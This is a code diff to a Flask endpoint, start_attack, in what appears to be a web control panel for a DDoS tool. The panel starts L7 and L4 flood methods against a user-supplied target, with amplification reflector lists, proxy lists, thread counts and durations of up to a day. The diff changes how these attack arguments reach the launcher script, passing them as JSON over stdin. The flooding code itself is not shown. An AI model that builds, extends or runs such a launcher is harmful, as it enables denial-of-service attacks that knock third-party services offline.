@@ -295,8 +295,7 @@ def start_attack():
     duration = _safe_int(data.get("duration", 60), 60, 1, 86400)
 
     start_py = str(BASE_DIR / "start.py")
-    # Pass the target over stdin so user input never appears in argv.
-    safe_cmd = [PYTHON_EXE, start_py, safe_method, "@stdin"]
+    attack_args = [safe_method, target]
 
     if layer == "L7":
         socks_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
@@ -305,14 +304,14 @@ def start_attack():
         rpc = _safe_int(data.get("rpc", 10), 10, 1, 10000)
         proxylist_candidate = Path(data.get("proxylist", "http.txt").strip() or "http.txt").name
         proxylist = proxylist_candidate if proxylist_candidate in ALLOWED_LIST_FILES else "http.txt"
-        safe_cmd.extend([str(socks_type), str(threads), proxylist, str(rpc), str(duration)])
+        attack_args.extend([str(socks_type), str(threads), proxylist, str(rpc), str(duration)])
     else:
-        safe_cmd.extend([str(threads), str(duration)])
+        attack_args.extend([str(threads), str(duration)])
         if method in METHODS_AMP:
             amp_candidate = Path(data.get("reflector", "").strip()).name
             amp_file = amp_candidate if amp_candidate in ALLOWED_LIST_FILES else None
             if amp_file is not None:
-                safe_cmd.append(amp_file)
+                attack_args.append(amp_file)
         else:
             proxy_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
             if proxy_type not in VALID_SOCKS_TYPES:
@@ -320,17 +319,16 @@ def start_attack():
             proxy_candidate = Path(data.get("proxylist", "").strip()).name
             proxy_file = proxy_candidate if proxy_candidate in ALLOWED_LIST_FILES else None
             if proxy_file is not None:
-                safe_cmd.extend([str(proxy_type), proxy_file])
+                attack_args.extend([str(proxy_type), proxy_file])
 
     task_id = str(uuid4())[:8]
 
-    # List-form Popen, no shell; all values are validated or allowlisted.
-    if any(argument.startswith("-") for argument in safe_cmd[1:]):
+    if any(argument.startswith("-") for argument in attack_args[1:]):
         return jsonify({"success": False, "error": "Invalid target."}), 400
 
     try:
         proc = Popen(
-            safe_cmd,
+            [PYTHON_EXE, start_py, "@web-attack"],
             cwd=str(BASE_DIR),
             stdout=PIPE,
             stderr=STDOUT,
@@ -344,11 +342,11 @@ def start_attack():
             return jsonify({"success": False, "error": "Failed to start process."}), 500
 
         try:
-            stdin.write((target + "\n").encode("utf-8"))
+            stdin.write(dumps({"args": attack_args}).encode("utf-8") + b"\n")
             stdin.close()
         except OSError:
             proc.terminate()
-            logger.exception("Failed to send target for task %s", task_id)
+            logger.exception("Failed to send task %s", task_id)
             return jsonify({"success": False, "error": "Failed to start process."}), 500
 
         with process_lock:
